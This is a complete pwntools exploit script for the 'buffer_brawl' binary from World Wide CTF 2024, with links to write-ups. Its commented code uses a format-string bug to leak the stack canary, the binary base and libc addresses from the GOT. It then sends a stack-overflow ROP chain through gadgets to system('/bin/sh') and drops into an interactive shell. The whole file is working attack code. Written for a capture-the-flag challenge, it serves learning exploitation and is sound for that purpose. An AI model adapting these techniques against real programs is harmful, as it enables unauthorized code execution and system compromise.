# https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/BufferBrawl/exploit.py
# https://ctf101.org/binary-exploitation/stack-canaries/
# https://seyd.ca/posts/2024/12/world-wide-ctf-2024-writeups/
from pwn import *

# set the terminal to use
context.terminal = ["gnome-terminal", "--"]

# open connection with the binary
shell = gdb.debug("./buffer_brawl", "continue")
# shell = process("./buffer_brawl")

# leak the stack canary
shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", b"%11$p")
canary = int(shell.recvline().strip().decode("utf-8"), 16)
log.info(f"Stack canary: {hex(canary)}")

# leak the binary base address
shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", b"%13$p")
bin_base_addr = int(shell.recvline().strip().decode("utf-8"), 16) - 0x1747
log.info(f"Binary base address: {hex(bin_base_addr)}")

# this reads the puts addr from the got
# from `disass 'puts@plt'` -> 0x3fa0 (puts@got offset)
# Explanation:
#   this `%7$s\n\00\00\00` is an 8 byte str passed to printf (needs to be 8 byte to align the next argument in the stack)
#   and this `p64(bin_base_addr + 0x3fa0)` is a format argument
#   so we will have a call like this: `printf('%7$s\x00\x00\x00\x00', p64(bin_base_addr + 0x3fa0))`;
#   this will take the addr to puts@got as a ptr to a str and read the addr from the got, leaking the puts addr
payload = b"%7$s\n\00\00\00" + p64(bin_base_addr + 0x3fa0)
shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", payload)
puts_addr = u64(shell.recvline().strip() + b"\00\00")
log.info(f"puts() addr: {hex(puts_addr)}")

# leak the printf addr (the same way we leaked the puts addr) for redundancy in detecting the libc version
payload = b"%7$s\n\00\00\00" + p64(bin_base_addr + 0x3fb0)
shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", payload)
printf_addr = u64(shell.recvline().strip() + b"\00\00")
log.info(f"printf() addr: {hex(printf_addr)}")

# from https://libc.rip/ we get that the puts offset is 0x5daa0
# we get this by using the addr of both the puts function and printf (this gives us a single option for the libc version)
libc_base = puts_addr - 0x5daa0
log.info(f"Libc base: {hex(libc_base)}")

# get the stack to 0xd (13) points (fastest way)
for _ in range(29):
    shell.sendlineafter(b"> ", b"3")

# from pwndbg, the rip is at offset 40 (using the cyclic pattern)
# this means that the canary is at offset 24 (40 - 8 - 8); need to compensate for the rbp and the rip itself
payload  = b"A" * 24
payload += p64(canary)               # make sure the canary is correct
payload += b"B" * 8                  # overwrite the rbp
payload += p64(libc_base + 0xdc936)  # overwrite the rip (`rop --grep "pop rdi" -- --nojop --depth 2` --> pop rdi ; ret)

# now add the arguments for system() to the payload
payload += p64(libc_base + 0x1b1f0e) # addr to a "/bin/sh" str in libc (`search "/bin/sh"`)
# payload += b"C" * 8
payload += p64(libc_base + 0x15cbe8) # xchg ebx, eax ; ret
payload += p64(libc_base + 0x2ed30)  # add the return addr for the second gadget (jump to system())

shell.sendlineafter(b": ", payload)
shell.recvline()
shell.interactive()
